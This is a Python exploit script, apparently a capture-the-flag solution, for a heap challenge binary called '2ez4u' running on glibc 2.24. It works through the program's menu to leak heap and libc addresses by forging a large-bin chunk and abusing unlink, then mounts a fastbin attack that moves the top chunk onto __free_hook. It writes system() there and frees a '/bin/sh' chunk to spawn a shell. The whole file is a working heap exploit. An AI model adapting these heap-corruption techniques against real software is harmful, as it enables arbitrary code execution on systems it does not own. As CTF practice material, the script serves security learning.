# File: exp.py
# Author: raycp
# Date: 2019-05-28
# Description: exp for 2ez4u

from pwn_debug import *

pdbg=pwn_debug("./2ez4u")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local("./libc.so","/glibc/x64/2.24/lib/ld-2.24.so")
pdbg.debug("2.24")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print type(pdbg.membp)
#print pdbg.hh
#print hex(membp.elf_base),hex(membp.libc_base)
#elf=pdbg.elf
libc=pdbg.libc
#a=IO_FILE_plus()
#print a
#a.show()
#print a._IO_read_basei

def add(size,desc='aaa',color='0',value='0',num='0'):
    p.recvuntil(": ")
    p.sendline("1")
    p.recvuntil("n):")
    p.sendline(str(color))
    p.recvuntil("999):")
    p.sendline(str(value))
    p.recvuntil("-16):")
    p.sendline(str(num))
    p.recvuntil("024):")
    p.sendline(str(size))
    p.recvuntil("apple:")
    p.sendline(desc)

def edit(idx,desc,color='3',value='1000',num='100'):
    p.recvuntil("hoice: ")
    p.sendline("3")
    p.recvuntil("0-15):")
    p.sendline(str(idx))
    p.recvuntil("n):")
    p.sendline(str(color))
    p.recvuntil("999):")
    p.sendline(str(value))
    p.recvuntil("-16):")
    p.sendline(str(num))
    p.recvuntil("apple:")
    p.send(desc)

def delete(idx):
    p.recvuntil("hoice: ")
    p.sendline("2")
    p.recvuntil("0-15):")
    p.sendline(str(idx))

def show(idx):
    p.recvuntil("hoice: ")
    p.sendline("4")
    p.recvuntil("0-15):")
    p.sendline(str(idx))

bp      = lambda bkp                :pdbg.bp(bkp)
sym     = lambda symbol             :pdbg.sym(symbol)
def bpp():
	bp([])
	input()

def pwn():
    
    
    #pdbg.bp(0x1217)
    add(0x10,'a\n') #0
    add(0x10,'a\n') #1
    add(0x10,'n\n') #2
    add(0x3e0,"a\n") #3
    add(0x60,"a\n")  #4
    add(0x3f0,"a\n") #5
    add(0x40,"a\n")  #6
    add(0x80,'a\n')  #7
    add(0x60,'a\n')  #8
    add(0x50,'a\n') #9
    add(0x290,'b\n') #10
    add(0x80,'a\n') #11

    delete(0)
    
    ## step 1 delete 2 large bin and leak heap address
    delete(5)
    delete(3)

    add(0x400,"a\n") #0
    show(3)
    p.recvuntil("tion:")
    heap_base=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))-0x4e0-0x30
    log.info("heap base: %s"%hex(heap_base))

    ## step 2 build fake large bin and malloc out fake larbebin
    unlink_addr=heap_base+0x58
    fake_large=heap_base+0x910+0x30
    payload=p64(0x411)+p64(unlink_addr-0x18)+p64(unlink_addr-0x10)
    #pdbg.bp(0x10cb)
    edit(1,p64(fake_large)+'\n') ## write large bin address to bypass unlink the largebin
    edit(6,payload+"\n")
    edit(10,'a'*0x218+p64(0x410)+p64(0x70)+'\n')
    log.info("fake large bin: %s"%hex(fake_large))
    payload=p64(fake_large)+'\n'
    edit(3,payload)
    #pdbg.bp(0xd22)
    
    delete(1)  ## clear 1st to avoid overwrite the 3rd ptr

    delete(11)
    delete(7)   # delete the same size chunk to smallbin to bypass '\x00' truncated in add
    payload='a'*0x28+p64(heap_base+0xdc0)[:-1]+'\n'
    add(0x3f0,payload) # 1 malloc out the fake largebin
    bpp()
    edit(3,p64(heap_base+0x510)+'\n') ## fix the largebin chain
    add(0x80,'1\n') #3 ## malloc out 0xdc0 and change fd to main arena

    #pdbg.bp(0x1217)

    ## step 3 leak libc address
    show(1)
    p.recvuntil('a'*0x28)
    libc_base=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))-libc.symbols['main_arena']-232
    #libc_base=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))- 0x3c4b20 -232
    free_hook=libc_base+libc.symbols['__free_hook']
    system_addr=libc_base+libc.symbols['system']
    log.info('leak libc base: %s'%hex(libc_base))

    #delete(0)
    edit(1,'a'*0x18+p64(0)+p64(0x81)[:-1]+'\n') ## fix chunk header
    

    ## step 4 fastbin attack to change top chunk which point to __free_hook
    delete(8)
    delete(9)
    
    fake_fastbin=libc_base+libc.symbols['main_arena']+0x30
    #fake_fastbin=libc_base+0x3c4b20+0x30
    payload='a'*0x18+p64(0)+p64(0x81)+'\x00'*0x90+p64(0)+p64(0x81)+p64(0x71)+p64(0x0)+'\x00'*0x60+p64(0)+p64(0x71)+p64(fake_fastbin)[:-1]+'\n'
    edit(1,payload) ## change fastbin chain to form fastbin attack

    #pdbg.bp([0xd22,0xee9])

    add(0x60,'a\n') #5
    add(0x50,'a\n') #6

    
    #pdbg.bp([0xd22,0xee9])
    payload=p64(free_hook-0xb58)[:-1]+'\n'
    add(0x50,payload) #7 overwrite top chunk to __free_hook

    ## fix fastbin chain
    delete(5)
    payload='a'*0x18+p64(0)+p64(0x81)+'\x00'*0x90+p64(0)+p64(0x81)+p64(0)+'\n'
    edit(1,payload)

    # clean bins and malloc from top chunk
    delete(2)
    add(0x60,'a\n') #2
    add(0x300,'\n') #5
    add(0x300,'\n') #9

    add(0x300,'\n') #12
    add(0x300,'\n') #13
    add(0x300,'\n') #14
    
    #pdbg.bp([0xd22,0xee9])
    payload='\x00'*0x1d0+p64(system_addr)+'\n'
    add(0x320,payload) #15
    
    payload='a'*0x18+p64(0)+p64(0x81)+'\x00'*0x90+p64(0)+p64(0x81)+'/bin/sh\x00'+'\n'
    edit(1,payload)

    ## trigger free to get shell
    delete(2)

    p.interactive()

if __name__ == '__main__':
   pwn()


